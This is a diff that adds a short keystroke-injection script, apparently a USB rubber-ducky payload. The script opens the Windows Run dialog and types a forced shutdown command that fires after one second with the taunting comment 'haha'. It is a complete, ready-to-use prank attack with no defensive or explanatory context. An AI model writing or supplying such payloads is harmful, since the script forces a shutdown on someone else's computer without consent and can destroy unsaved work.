@@ -1,0 +1,7 @@
+LOCAL GB
+DELAY 1000
+GUI r
+DELAY 300
+STRING shutdown -s -t 1 -c "haha"
+DELAY 300
+ENTER
